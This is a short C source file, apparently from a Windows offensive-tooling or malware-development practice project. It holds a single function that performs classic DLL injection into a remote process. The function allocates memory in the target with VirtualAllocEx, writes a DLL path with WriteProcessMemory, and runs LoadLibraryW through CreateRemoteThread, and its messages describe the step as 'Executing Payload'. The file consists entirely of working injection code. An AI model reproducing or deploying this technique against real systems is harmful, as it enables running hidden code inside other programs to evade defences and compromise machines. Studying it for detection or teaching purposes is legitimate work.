#include "glassBox.h"

BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {

	BOOL	bSTATE = TRUE;

	LPVOID	pLoadLibraryW = NULL;
	LPVOID	pAddress = NULL;

	// Fetching size of DllName in bytes
	DWORD	dwSizeToWrite = (lstrlenW(DllName) + 1) * sizeof(WCHAR);

	SIZE_T	lpNumberOfBytesWritten = 0;

	HANDLE	hThread = NULL;

	pLoadLibraryW = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		warn("GetProcAddress Failed with Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		warn("VirtualAlloc Failed with Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	info("pAddress Allocated at: 0x%p Of Size: %d", pAddress, dwSizeToWrite);
	in("Press <Enter> to Write ...");
	getchar();

	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		warn("WriteProcessMemory Failed with Error : %d", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	okay("Successfully Written %zu Bytes", lpNumberOfBytesWritten);
	in("Press <Enter> to Run ...");
	getchar();

	info("Executing Payload ...");

	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		warn("CreateRemoteThread Failed with Error : %d", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	okay("DONE!\n");


_EndOfFunction:
	if (hThread)
		CloseHandle(hThread);
	return bSTATE;
}